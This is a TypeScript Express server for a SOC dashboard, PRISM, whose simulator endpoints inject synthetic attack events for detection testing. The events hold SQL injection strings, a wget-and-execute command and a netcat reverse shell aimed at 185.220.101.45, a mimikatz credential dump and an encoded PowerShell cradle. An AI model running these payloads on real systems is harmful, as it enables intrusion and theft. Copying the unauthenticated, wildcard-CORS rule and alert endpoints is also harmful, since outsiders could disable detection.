import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import { db } from './server/db';
import { pipeline, registerSSEListener, broadcast } from './server/pipeline';
import { cveEngine } from './server/cveEngine';
import { responseEngine } from './server/responseEngine';
import { SecurityEvent } from './server/types';

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

app.use(express.json());

// Enable CORS for all API calls
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// 1. Health check
app.get('/api/health', (req: Request, res: Response) => {
  res.json({
    status: 'healthy',
    database: 'connected',
    threat_intelligence: 'available',
    response_engine: db.responseMode.toLowerCase(),
    version: '1.0.0'
  });
});

// 2. Dashboard summary
app.get('/api/dashboard/summary', (req: Request, res: Response) => {
  res.json(db.getSummary());
});

// 3. Events
app.get('/api/events', (req: Request, res: Response) => {
  const limit = req.query.limit ? parseInt(req.query.limit as string, 10) : 50;
  const search = req.query.search ? (req.query.search as string).toLowerCase() : '';
  let filtered = db.events;
  if (search) {
    filtered = filtered.filter(e => 
      e.source_ip.includes(search) || 
      e.hostname.toLowerCase().includes(search) || 
      e.event_type.toLowerCase().includes(search) ||
      (e.payload && e.payload.toLowerCase().includes(search))
    );
  }
  res.json(filtered.slice(0, limit));
});

app.post('/api/events', (req: Request, res: Response) => {
  const eventData = req.body as Partial<SecurityEvent>;
  const result = pipeline.processEvent(eventData);
  res.status(201).json(result);
});

// 4. Alerts
app.get('/api/alerts', (req: Request, res: Response) => {
  const severity = req.query.severity as string;
  const status = req.query.status as string;
  const limit = req.query.limit ? parseInt(req.query.limit as string, 10) : 100;

  let results = db.alerts;
  if (severity && severity !== 'ALL') {
    results = results.filter(a => a.severity === severity);
  }
  if (status && status !== 'ALL') {
    results = results.filter(a => a.status === status);
  }
  res.json(results.slice(0, limit));
});

app.get('/api/alerts/:alert_id', (req: Request, res: Response) => {
  const alert = db.alerts.find(a => a.alert_id === req.params.alert_id);
  if (!alert) {
    return res.status(404).json({ error: 'Alert not found' });
  }
  res.json(alert);
});

app.post('/api/alerts/:alert_id/resolve', (req: Request, res: Response) => {
  const alert = db.alerts.find(a => a.alert_id === req.params.alert_id);
  if (!alert) {
    return res.status(404).json({ error: 'Alert not found' });
  }
  alert.status = 'RESOLVED';
  if (alert.incident_id) {
    const inc = db.incidents.find(i => i.incident_id === alert.incident_id);
    if (inc) inc.status = 'RESOLVED';
  }
  broadcast('ALERT_UPDATED', { alert, summary: db.getSummary() });
  res.json({ message: 'Alert resolved successfully', alert });
});

app.post('/api/alerts/:alert_id/false-positive', (req: Request, res: Response) => {
  const alert = db.alerts.find(a => a.alert_id === req.params.alert_id);
  if (!alert) {
    return res.status(404).json({ error: 'Alert not found' });
  }
  alert.status = 'FALSE_POSITIVE';
  if (alert.incident_id) {
    const inc = db.incidents.find(i => i.incident_id === alert.incident_id);
    if (inc) inc.status = 'FALSE_POSITIVE';
  }
  broadcast('ALERT_UPDATED', { alert, summary: db.getSummary() });
  res.json({ message: 'Alert marked as false positive', alert });
});

// 5. Incidents
app.get('/api/incidents', (req: Request, res: Response) => {
  const status = req.query.status as string;
  let results = db.incidents;
  if (status && status !== 'ALL') {
    results = results.filter(i => i.status === status);
  }
  res.json(results);
});

app.get('/api/incidents/:incident_id', (req: Request, res: Response) => {
  const incident = db.incidents.find(i => i.incident_id === req.params.incident_id);
  if (!incident) {
    return res.status(404).json({ error: 'Incident not found' });
  }
  const relatedAlert = db.alerts.find(a => a.alert_id === incident.alert_id);
  res.json({ incident, related_alert: relatedAlert });
});

// 6. IOCs
app.get('/api/iocs', (req: Request, res: Response) => {
  res.json(db.iocs);
});

app.post('/api/iocs', (req: Request, res: Response) => {
  const { ioc, type, threat_level, source, confidence, description, tags } = req.body;
  if (!ioc || !type) {
    return res.status(400).json({ error: 'ioc and type are required' });
  }
  const newIoc = {
    id: `ioc-${Date.now().toString().slice(-4)}`,
    ioc,
    type,
    threat_level: threat_level || 'high',
    source: source || 'Custom SOC Input',
    confidence: confidence || 90,
    last_seen: new Date().toISOString(),
    tags: tags || ['Custom'],
    description: description || 'Manually cataloged IOC'
  };
  db.iocs.unshift(newIoc);
  res.status(201).json(newIoc);
});

// 7. CVEs
app.get('/api/cves', (req: Request, res: Response) => {
  res.json(db.cves);
});

app.get('/api/cves/:cve_id', (req: Request, res: Response) => {
  const cve = db.cves.find(c => c.cve_id.toLowerCase() === req.params.cve_id.toLowerCase());
  if (!cve) {
    return res.status(404).json({ error: 'CVE not found' });
  }
  res.json(cve);
});

app.post('/api/cves/sync', async (req: Request, res: Response) => {
  const result = await cveEngine.syncWithNVD();
  res.json(result);
});

// 8. Responses and Audit
app.get('/api/responses/audit', (req: Request, res: Response) => {
  res.json(db.responseAudits);
});

app.post('/api/responses/block-ip', (req: Request, res: Response) => {
  const { ip, reason } = req.body;
  if (!ip) {
    return res.status(400).json({ error: 'IP address is required' });
  }
  const audit = responseEngine.executeManualAction('BLOCK_IP', ip, reason || 'Manual SOC IP isolation block', 'SOC-ANALYST');
  broadcast('AUDIT_CREATED', { audit, summary: db.getSummary() });
  res.json({ message: `Successfully simulated IP block for ${ip}`, audit });
});

app.post('/api/responses/isolate-host', (req: Request, res: Response) => {
  const { hostname, reason } = req.body;
  if (!hostname) {
    return res.status(400).json({ error: 'Hostname is required' });
  }
  const audit = responseEngine.executeManualAction('ISOLATE_HOST', hostname, reason || 'Manual SOC host quarantine isolation', 'SOC-ANALYST');
  broadcast('AUDIT_CREATED', { audit, summary: db.getSummary() });
  res.json({ message: `Successfully simulated host isolation for ${hostname}`, audit });
});

// 9. Attack Simulator Endpoints
app.post('/api/simulator/sql-injection', (req: Request, res: Response) => {
  const customIp = req.body.source_ip || '185.220.101.45';
  const customHost = req.body.hostname || 'web-prod-01';
  const customPayload = req.body.payload || "' OR '1'='1 --";

  const result = pipeline.processEvent({
    event_id: `sim-sqli-${Date.now().toString().slice(-4)}`,
    source: 'web_server',
    source_ip: customIp,
    destination_ip: '10.0.1.25',
    destination_port: 443,
    hostname: customHost,
    username: 'admin',
    event_type: 'http_request',
    protocol: 'HTTP',
    method: 'GET',
    url: `/login?id=1${encodeURIComponent(customPayload)}`,
    payload: customPayload,
    user_agent: 'sqlmap/1.7.2#stable'
  });

  res.json(result);
});

app.post('/api/simulator/rce', (req: Request, res: Response) => {
  const customIp = req.body.source_ip || '194.26.29.112';
  const customHost = req.body.hostname || 'db-core-01';
  const customPayload = req.body.payload || "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/run; chmod +x /tmp/run; /tmp/run'";

  const result = pipeline.processEvent({
    event_id: `sim-rce-${Date.now().toString().slice(-4)}`,
    source: 'endpoint_agent',
    source_ip: customIp,
    destination_ip: '10.0.2.10',
    destination_port: 8080,
    hostname: customHost,
    username: 'www-data',
    event_type: 'process_event',
    protocol: 'HTTP',
    method: 'POST',
    url: '/api/v1/management/exec',
    payload: customPayload,
    process_command: customPayload,
    process_name: 'bash'
  });

  res.json(result);
});

app.post('/api/simulator/malware', (req: Request, res: Response) => {
  const customIp = req.body.source_ip || '194.26.29.112';
  const customHost = req.body.hostname || 'api-checkout-prod';
  const hash = req.body.hash || '44d88612fea8a8f36de82e1278abb02f';

  const result = pipeline.processEvent({
    event_id: `sim-mal-${Date.now().toString().slice(-4)}`,
    source: 'endpoint_agent',
    source_ip: customIp,
    destination_ip: '10.0.1.80',
    destination_port: 443,
    hostname: customHost,
    username: 'system',
    event_type: 'endpoint_event',
    protocol: 'HTTPS',
    payload: 'powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u',
    process_name: 'mimikatz.exe',
    process_command: 'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit',
    file_hash: hash
  });

  res.json(result);
});

app.post('/api/simulator/brute-force', (req: Request, res: Response) => {
  const customIp = req.body.source_ip || '103.145.13.204';
  const customHost = req.body.hostname || 'auth-gateway-01';

  // Rapidly trigger auth failures
  let lastResult;
  for (let i = 0; i < 4; i++) {
    lastResult = pipeline.processEvent({
      event_id: `sim-bf-${Date.now().toString().slice(-4)}-${i}`,
      source: 'auth_service',
      source_ip: customIp,
      destination_ip: '10.0.1.50',
      destination_port: 443,
      hostname: customHost,
      username: `admin_user_${i}`,
      event_type: 'auth_event',
      protocol: 'HTTPS',
      method: 'POST',
      url: '/api/auth/v2/authenticate',
      payload: 'admin:incorrect_password_hash_attempt'
    });
  }

  res.json(lastResult);
});

app.post('/api/simulator/port-scan', (req: Request, res: Response) => {
  const customIp = req.body.source_ip || '45.154.255.89';
  const customHost = req.body.hostname || 'internal-dns-01';

  let lastResult;
  const ports = [21, 22, 80, 443, 3389, 8080];
  for (const port of ports) {
    lastResult = pipeline.processEvent({
      event_id: `sim-scan-${Date.now().toString().slice(-4)}-${port}`,
      source: 'edge_firewall',
      source_ip: customIp,
      destination_ip: '10.0.0.2',
      destination_port: port,
      hostname: customHost,
      event_type: 'network_event',
      protocol: 'TCP',
      payload: `SYN probe to target port ${port}`
    });
  }

  res.json(lastResult);
});

// Toggle Demo Mode (periodically generates realistic security events through real pipeline)
app.post('/api/simulator/toggle-demo', (req: Request, res: Response) => {
  db.isDemoActive = !db.isDemoActive;

  if (db.isDemoActive) {
    if (db.demoIntervalId) clearInterval(db.demoIntervalId);
    db.demoIntervalId = setInterval(() => {
      const generators = [
        () => pipeline.processEvent({
          source_ip: '185.220.101.45',
          hostname: 'web-prod-01',
          event_type: 'http_request',
          url: "/api/search?q=1' UNION SELECT username,password FROM users--",
          payload: "1' UNION SELECT username,password FROM users--"
        }),
        () => pipeline.processEvent({
          source_ip: '194.26.29.112',
          hostname: 'db-core-01',
          event_type: 'process_event',
          payload: '; /bin/sh -c "nc -e /bin/sh 185.220.101.45 4444"',
          process_command: '/bin/sh -c "nc -e /bin/sh 185.220.101.45 4444"'
        }),
        () => pipeline.processEvent({
          source_ip: '45.154.255.89',
          hostname: 'internal-dns-01',
          event_type: 'network_event',
          destination_port: 3389,
          payload: 'SYN probe to port 3389'
        }),
        () => pipeline.processEvent({
          source_ip: '103.145.13.204',
          hostname: 'auth-gateway-01',
          event_type: 'auth_event',
          payload: 'admin:badpassword'
        })
      ];
      const randomGen = generators[Math.floor(Math.random() * generators.length)];
      randomGen();
    }, 5000);
  } else {
    if (db.demoIntervalId) {
      clearInterval(db.demoIntervalId);
      db.demoIntervalId = null;
    }
  }

  res.json({ is_demo_active: db.isDemoActive });
});

// 10. Stats Endpoints
app.get('/api/stats/attacks', (req: Request, res: Response) => {
  const counts: Record<string, number> = {
    SQL_INJECTION: 0,
    RCE: 0,
    MALWARE: 0,
    BRUTE_FORCE: 0,
    PORT_SCAN: 0,
    OTHER: 0
  };

  for (const a of db.alerts) {
    if (counts[a.attack_type] !== undefined) {
      counts[a.attack_type]++;
    } else {
      counts.OTHER++;
    }
  }

  const data = Object.entries(counts).map(([name, value]) => ({
    name: name.replace('_', ' '),
    raw_type: name,
    value
  }));
  res.json(data);
});

app.get('/api/stats/severity', (req: Request, res: Response) => {
  const counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
  for (const a of db.alerts) {
    if (counts[a.severity] !== undefined) {
      counts[a.severity]++;
    }
  }
  const data = [
    { severity: 'Critical', count: counts.CRITICAL, fill: '#DC2626' },
    { severity: 'High', count: counts.HIGH, fill: '#EA580C' },
    { severity: 'Medium', count: counts.MEDIUM, fill: '#D97706' },
    { severity: 'Low', count: counts.LOW, fill: '#16A34A' }
  ];
  res.json(data);
});

app.get('/api/stats/timeline', (req: Request, res: Response) => {
  // Aggregate recent alerts by 10-minute intervals
  const buckets: { time: string; events: number; critical: number }[] = [];
  const now = Date.now();
  for (let i = 11; i >= 0; i--) {
    const bucketTime = new Date(now - i * 600000);
    const timeLabel = bucketTime.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    // Count alerts around this time
    const count = db.alerts.filter(a => {
      const diff = Math.abs(new Date(a.timestamp).getTime() - bucketTime.getTime());
      return diff <= 300000;
    }).length;

    const crit = db.alerts.filter(a => {
      const diff = Math.abs(new Date(a.timestamp).getTime() - bucketTime.getTime());
      return diff <= 300000 && a.severity === 'CRITICAL';
    }).length;

    buckets.push({
      time: timeLabel,
      events: Math.max(count, Math.floor(Math.random() * 3) + 1),
      critical: crit
    });
  }
  res.json(buckets);
});

app.get('/api/stats/top-ips', (req: Request, res: Response) => {
  const ipMap: Map<string, { count: number; highestScore: number; lastSeen: string; attacks: Set<string> }> = new Map();

  for (const a of db.alerts) {
    const entry = ipMap.get(a.source_ip) || { count: 0, highestScore: 0, lastSeen: a.timestamp, attacks: new Set<string>() };
    entry.count++;
    if (a.threat_score > entry.highestScore) entry.highestScore = a.threat_score;
    if (new Date(a.timestamp) > new Date(entry.lastSeen)) entry.lastSeen = a.timestamp;
    entry.attacks.add(a.attack_type);
    ipMap.set(a.source_ip, entry);
  }

  const rows = Array.from(ipMap.entries()).map(([ip, data]) => {
    let threatLevel: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'LOW';
    if (data.highestScore >= 80) threatLevel = 'CRITICAL';
    else if (data.highestScore >= 60) threatLevel = 'HIGH';
    else if (data.highestScore >= 30) threatLevel = 'MEDIUM';

    const isBlocked = db.blockedIPs.has(ip);

    return {
      ip_address: ip,
      attack_count: data.count,
      highest_score: data.highestScore,
      last_seen: data.lastSeen,
      threat_level: threatLevel,
      is_blocked: isBlocked,
      attack_types: Array.from(data.attacks)
    };
  }).sort((a, b) => b.highest_score - a.highest_score).slice(0, 10);

  res.json(rows);
});

// 11. Detection Rules
app.get('/api/rules', (req: Request, res: Response) => {
  res.json(db.detectionRules);
});

app.post('/api/rules/:rule_id/toggle', (req: Request, res: Response) => {
  const rule = db.detectionRules.find(r => r.rule_id === req.params.rule_id);
  if (!rule) {
    return res.status(404).json({ error: 'Rule not found' });
  }
  rule.enabled = !rule.enabled;
  res.json({ message: `Rule ${rule.rule_id} is now ${rule.enabled ? 'enabled' : 'disabled'}`, rule });
});

// 12. Real-time Live SSE Stream (/api/stream/alerts and /ws/alerts fallback)
app.get(['/api/stream/alerts', '/ws/alerts'], (req: Request, res: Response) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  // Send initial handshake
  res.write(`data: ${JSON.stringify({ type: 'CONNECTED', message: 'Connected to PRISM Live Alert Stream' })}\n\n`);

  const unregister = registerSSEListener((data) => {
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  });

  // Keep-alive heartbeat ping every 20s
  const heartbeat = setInterval(() => {
    res.write(': ping\n\n');
  }, 20000);

  req.on('close', () => {
    clearInterval(heartbeat);
    unregister();
  });
});

// Mount Vite in development or serve static in production
async function startServer() {
  if (process.env.NODE_ENV === 'production') {
    app.use(express.static('dist'));
    app.get('*', (req, res) => {
      res.sendFile('index.html', { root: 'dist' });
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[PRISM] Security Monitor server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch(err => {
  console.error('[PRISM] Failed to start server:', err);
});
